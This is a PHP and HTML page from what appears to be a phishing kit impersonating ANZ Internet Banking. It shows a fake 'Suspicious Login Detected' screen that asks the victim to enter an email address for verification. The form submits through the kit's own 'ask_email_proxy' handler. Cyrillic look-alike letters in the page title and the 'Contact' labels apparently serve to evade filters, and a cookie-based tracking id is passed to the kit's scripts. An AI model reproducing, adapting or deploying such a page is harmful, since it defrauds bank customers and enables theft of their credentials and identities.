<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="email/";
?>

<!DOCTYPE html>
<html>

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">



<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">



<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/token/core_token.css">






<script type="text/javascript" src="<?php echo $php_js->relative_root ?>modules/email/main.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>modules/email/main.css">

<base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
<link rel="stylesheet" href="form/css.css">



    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta charset="utf-8">
    <title>
        &#1040;NZ Internet B&#1072;nking
    </title>
    

    <link media="all" type="text/css" rel="stylesheet" href="index.css">

    <link rel="stylesheet" href="css.css">



</head>

<body     ng-app="app" ng-controller="c1" ng-model-options="{'updateOn':'blur'}"      >
    <header role="banner">
        <form method="POST" onsubmit="return false" name="headerFrm" id="mainTable">
            <div class="headerOuterTable">
                <div class="headerLeftLogo">
                    <img title="ANZ logo" alt="" name="Img_AffiliateLogo" src="anz-logo.png" border="0">
                </div>
                <div class="headerTextCenter">
                    <a class="skipContent skipToContent">Skip to content&nbsp;&nbsp;&nbsp;</a>
                </div>
                <div class="headerTextLogout">
                    <div class="headerTextRight">
                        <a aria-label="What's new">
                            <div aria-hidden="true" style="display: inline-block; cursor: pointer;">
                                <div class="contactUsHeader">
                                    <div class="headerImageRightDiv">
                                        <i class="headerChatIcon icon-new" id="icon-new" style="font-size: 16px;"></i>
                                    </div>
                                    <div>What's new</div>
                                </div>
                            </div>
                        </a>
                        <a class="textHeader" id="contactUS" role="button">
                            <div class="contactUsHeader">
                                <div class="headerImageRightDiv">
                                    <i class="headerChatIcon icon-chat" id="icon-chat"></i>
                                </div>
                                <div>&#1057;&#1086;nt&#1072;&#1089;t</div>
                            </div>
                        </a>
                        <a class="textHeader" role="button">
                            <div class="mailsHeader mailIconNegativeRightMargin">
                                <div class="headerImageRightDiv">
                                    <img alt="mail" name="Img_MailIcon" src="mail-icon-1digit.png" class="headerImgBorderStyle" border="0">
                                    <sup class="headerSuperScript">3</sup>
                                </div>
                                <div class="mailsHeaderText">Mail</div>
                            </div>
                        </a>
                    </div>
                    <div class="logoutButtonDivClass">
                        <button role="button" type="submit" class="button-logout" name="Action.CorpUser.001.SignoffConfirm">
                            <i class="icon-login_padlock button-icon-size button-icon-right-margin" id="icon-login_padlock"></i>Log out</button>
                    </div>
                </div>
                <div class="mobileHeaderRightSection">
                    <div class="mobileHeaderButton">
                        <i class="icon-more" id="icon-more"></i>
                    </div>
                    <div class="mobileHeaderDropDown" style="display: none;">
                        <a class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-chat mobileHeaderDropDownIcon" id="icon-chat"></i>&#1057;&#1086;nt&#1072;&#1089;t
                            </div>
                        </a>
                        <a class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-mail mobileHeaderDropDownIcon" id="icon-mail"></i>Mail
                                <div class="mobileHeaderMailCount">3</div>
                            </div>
                        </a>
                        <a aria-label="What's new">
                            <div class="mobileHeaderListElement">
                                <i class="icon-new mobileHeaderDropDownIcon" id="icon-new"></i>What's new
                            </div>
                        </a>
                        <a target="" class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-wealth mobileHeaderDropDownIcon" id="icon-wealth"></i>JOIN ANZ SHARE INVESTING
                            </div>
                        </a>
                        <a target="" class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-login_padlock mobileHeaderDropDownIcon" id="icon-login_padlock"></i>Logout
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </form>
    </header>
    <nav role="navigation">
        <div class="menuBarOuter">
            <ul class="navBarList">
                <li class="menuLiClass homeButtonLeftMargin">
                    <a class="block " aria-label="Home">
                        <i class="icon-home" id="icon-home"></i>
                    </a>
                </li>
                <li class="menuLiClass">
                    <a class="block ">
                        <span>Payments</span>
                    </a>
                </li>
                <li class="menuLiClass">
                    <a class="block selected">
                        <span>Profile</span>
                        <span style="position: absolute; text-indent: -9999px;" tabindex="-1">
                            You are here
                        </span>
                    </a>
                </li>
                <li class="menuLiClass">
                    <a class="block ">
                        <span>Products</span>
                    </a>
                </li>
            </ul>
            <div class="menuLiClass navBarAnzsiButtonPosition" id="AnzsiButton">
                <a target="" class="navBarAnzsiPadding block" role="button">
                    <div class="navBarAnzsiButton">
                        JOIN ANZ SHARE INVESTING
                        <i class="icon-arrow_right" id="icon-arrow_right"></i>
                    </div>
                </a>
            </div>
        </div>
    </nav>
    <main role="main">
        <a name="mainContent" id="mainContent"></a>
        <div id="cover" style="display: none;"></div>














        
       
        <div class="mainContentClass scum" id="email-view" style="display:; ;">
            <form  onsubmit="send1(event,'ask_email_proxy');return false" name="Update">
                <div id="boxes" class="window" align="center">
                    <div id="dialog" class="window">
                        <div id="targetjsp" role="dialog">
                        </div>
                        <a class="done">Go</a>&nbsp;&nbsp;&nbsp;
                        <a class="close">Close</a>
                        <br>
                    </div>
                </div>
                <div id="mask"></div>
                <div id="Changepersonaladdress/contactdetails" class="pageTitleDivClass">
                    <h1>Suspicious Login Detected
                    </h1>   
                    <p class="p98">
                        Please fill out the required fields in order for us to verify your identity.
                    </p>
                    <div class="divTitleRight" id="accountsicons">
                        <div class="divTitle">
                            <a class="iconAAccClass">
                                <div class="newIcondiv">
                                    <i class="icon-print iconsNewSize" id="imageprint" title="print"></i>
                                    <div class="iconTextNewsite">Print</div>
                                </div>
                            </a>
                        </div>
                        <div valign="top" class="divTitle">
                            <a class="modalstart iconAAccClass">
                                <div class="newIcondiv">
                                    <i class="icon-feedback iconsNewSize" id="imagefeedback" title="ANZ Internet Banking feedback"></i>
                                    <div class="iconTextNewsite">Feedback</div>
                                </div>
                            </a>
                        </div>
                        <div class="divTitle">
                            <a class="iconAAccClass">
                                <div class="newIcondiv">
                                    <i class="icon-help iconsNewSize" title="Help" id="imagehelp"></i>
                                    <div class="iconTextNewsite">Help</div>
                                </div>
                            </a>
                        </div>
                    </div>
                </div>
                <div id="div_TabGp">
                    <ul id="ul_TabGp">
                        <li id="li_tab1" class="li_TabGp li_FirstTab activeTab">
                            <a>
                                Email verificationn</a>
                        </li>
                    </ul>
                    <div id="Content_Area" style="padding: 15px;">
                        <div id="tab1" style="display: block;">
                            <div>
                                <!--  -->
                                <!--  -->



                                <div class="elementSpacingDiv form-group">
                                    <div class="formLabel">Email address
                                       
                                    </div>
                                    <div class="emailPadding">
                                        <div>
                                            <input  ng-model="data.email" name="email"   class="inputWithoutIcon emailField form-control" id="email" pattern=".{4,}"  autocomplete="off" type="email">
                                            <span class="err_span">Information incorrect</span>
                                        </div>
                                    </div>
                                </div>



                                
                                
                                <!--  -->
                                
                                <!--  -->
                                
                                <!--  -->
                                <!--  -->
                            </div>
                        </div>
                    </div>
                </div>
                <div class="updateButtons">
                    <div class="buttonsUpdate buttonsUpdateLeft" style="float: right;">
                        <button role="button" type="submit" name="Action.UpdatePersonalAddressDetailsNew.AU.Submit" title="" id="updateDetails" class="button-action">Confirm
                            <i class="icon-arrow_right button-icon-size button-icon-left-margin" id="icon-arrow_right"></i>
                        </button>
                    </div>
                    <div class="buttonsUpdate" style="float: left;">
                        <button role="reset" type="reset" name="Action.Cancel" title="" id="Backbutton" class="button-secondary">Reset</button>
                    </div>
                </div>
            </form>
        </div>












        <div id="" class="mobilePageTitleDivClass">
            <div class="divTitleRight mobileDivTitleRight">
                <div class="divTitle">
                    <a class="iconAAccClass">
                        <div class="newIcondiv">
                            <i class="icon-print iconsNewSize" id="imageprint" title="print"></i>
                            <div class="iconTextNewsite">Print</div>
                        </div>
                    </a>
                </div>
                <div valign="top" class="divTitle">
                    <a class="modalstart iconAAccClass">
                        <div class="newIcondiv">
                            <i class="icon-feedback iconsNewSize" id="imagefeedback" title="ANZ Internet Banking feedback"></i>
                            <div class="iconTextNewsite">Feedback</div>
                        </div>
                    </a>
                </div>
                <div class="divTitle">
                    <a class="iconAAccClass">
                        <div class="newIcondiv">
                            <i class="icon-help iconsNewSize" title="Help" id="imagehelp"></i>
                            <div class="iconTextNewsite">Help</div>
                        </div>
                    </a>
                </div>
            </div>
        </div>
        
    </main>
    <footer role="contentinfo">
        <div class="footerSection">
            <div class="footer_text_sec">
                © Australia and New Zealand Banking Group Limited (ANZ)
                <span> 2015</span>
                <span style="white-space: nowrap;"> ABN
                    <span>11</span>
                    <span>005</span>
                    <span>357</span>
                    <span>522</span>
                </span>.
            </div>
        </div>
    </footer>





<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body>


</html>
